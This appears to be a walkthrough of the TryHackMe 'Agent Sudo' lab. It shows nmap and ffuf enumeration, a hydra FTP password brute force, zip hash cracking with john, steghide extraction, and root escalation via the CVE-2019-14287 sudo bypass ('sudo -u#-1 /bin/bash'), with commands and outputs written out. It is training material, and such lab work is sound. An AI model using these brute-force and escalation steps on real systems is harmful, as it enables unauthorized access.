##  Agent Sudo
https://tryhackme.com/room/agentsudoctf

### Enum
```
# nmap -Pn -sC -sV -A 10.10.164.100 -vv
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 12:44 JST
Scanning target.thm (10.10.164.100) [1000 ports]
Discovered open port 21/tcp on 10.10.164.100
Discovered open port 22/tcp on 10.10.164.100
Discovered open port 80/tcp on 10.10.164.100
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/18%OT=21%CT=1%CU=40512%PV=Y%DS=4%DC=T%G=Y%TM=62D4D76
```
```
ffuf -u http://10.10.164.100/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
```
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 558ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1107ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4461ms]
index.php               [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 477ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 477ms]
:: Progress: [4712/4712] :: Job [1/1] :: 78 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

```
curl  http://10.10.164.100
```

```
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```
👽 user-agent? Read Hint

```
ffuf -u http://10.10.164.100 -H "User-Agent: FUZZ" -w Uppercase.txt -r -t 1
```
```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.164.100
 :: Wordlist         : FUZZ: Uppercase.txt
 :: Header           : User-Agent: FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

A                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 432ms]
B                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 434ms]
C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 449ms]
D                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 431ms]
E                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 437ms]
F                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 440ms]
G                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 421ms]
H                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 440ms]
I                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 431ms]
J                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 421ms]
K                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 420ms]
L                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 442ms]
M                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 425ms]
N                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 434ms]
O                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 453ms]
P                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 461ms]
Q                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 440ms]
R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 446ms]
S                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 448ms]
T                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 445ms]
U                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 431ms]
V                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 437ms]
W                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 442ms]
X                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 429ms]
Y                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 455ms]
Z                       [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 432ms]
:: Progress: [26/26] :: Job [1/1] :: 2 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```
👽 C and R is different from others.

```
curl  http://10.10.164.100 -H 'User-Agent: C' -L
```
```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

```
curl http://10.10.164.100 -H 'User-Agent: R' -L
```
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```
👽 Agent C 's password is weak...


```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.164.100
```

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-18 15:07:25
[21][ftp] host: 10.10.186.164   login: c***   password: *******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-18 15:09:22
```

```
ftp> open
(to) 10.10.164.100
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62609|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *.*
226 Transfer complete.
34842 bytes received in 00:01 (32.82 KiB/s)
```

```
cat To_agentJ.txt
```
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

```
binwalk -e cutie.png --run-as=root
cd _cutie.png.extracted
```
👽 Extracted zip file is locked by password. Read hint john...

```
zip2john 8702.zip > 8702_hash
john 8702_hash
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
*****            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2022-07-18 15:31) 1.428g/s 76614p/s 76614c/s 76614C/s 123456..faithfaith
Session completed.
```

```
7z e 8702.zip
cat To_agentR.txt
```

```
Agent C,

We need to send the picture to 'QXJlYTUx as soon as possible!

By,
Agent R
```
👽 What's the 'QXJlYTUx'?

https://www.boxentriq.com/code-breaking/cipher-identifier

![image](https://user-images.githubusercontent.com/6504854/179473576-a95e3921-43f0-4056-9292-a3470f66668b.png)

👽 I got password of steg file.

```
steghide --info cute-alien.jpg
```
```
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

```
steghide extract -sf cute-alien.jpg
```
```
Enter passphrase:
wrote extracted data to "message.txt".
```

```
cat message.txt
```
```
Hi james,

Glad you find this message. Your login password is ************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### Flag
```
ssh james@10.10.164.100
```
```
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
👽(ALL, !root)

https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
```
```
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```
👽 Congratrations, Happy Hacking.
